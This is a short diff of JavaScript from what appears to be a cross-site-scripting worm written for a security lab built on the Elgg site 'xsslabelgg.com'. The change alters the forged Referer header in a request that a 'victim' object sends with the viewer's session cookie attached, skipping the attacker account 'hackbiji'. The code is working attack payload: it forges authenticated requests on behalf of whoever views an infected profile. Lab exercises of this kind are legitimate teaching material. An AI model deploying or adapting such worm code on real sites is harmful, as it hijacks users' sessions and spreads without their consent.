@@ -12,7 +12,7 @@ if(user!='hackbiji'){
     victim.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
     victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
     victim.setRequestHeader("Accept-Encoding","gzip, deflate");
-    victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/samy");
+    victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+user);
     victim.setRequestHeader("Cookie",document.cookie);
     victim.setRequestHeader("Connection","keep-alive");
     victim.send();
